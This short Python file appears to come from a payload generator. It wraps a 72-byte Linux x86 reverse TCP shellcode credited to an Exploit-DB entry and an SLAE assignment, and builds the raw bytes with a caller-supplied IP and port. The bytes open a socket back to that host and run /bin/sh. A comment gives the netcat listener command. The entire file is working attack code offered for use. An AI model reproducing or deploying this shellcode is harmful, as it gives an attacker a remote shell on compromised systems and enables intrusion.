#https://www.exploit-db.com/exploits/36397/
#Linux x86 - Reverse TCP Shell - 72 bytes
#Author: xmgv
#Details: https://xmgv.wordpress.com/2015/02/21/slae-assignment-2-reverse-shell/


#WORK 4.0.0-kali1-686-pae
#Connect : nc -lvp [PORT]
def reverse_tcpx86( IP, PORT):
	shellcode =  r"\x6a\x66\x58\x99\x52\x42\x52\x89\xd3\x42\x52\x89\xe1\xcd\x80\x93\x89\xd1\xb0"
	shellcode += r"\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x87\xda\x68"
	shellcode += IP
	shellcode += r"\x66\x68"
	shellcode += PORT
	shellcode += r"\x66\x53\x43\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x6a\x0b\x58\x99\x89\xd1"
	shellcode += r"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
	return shellcode


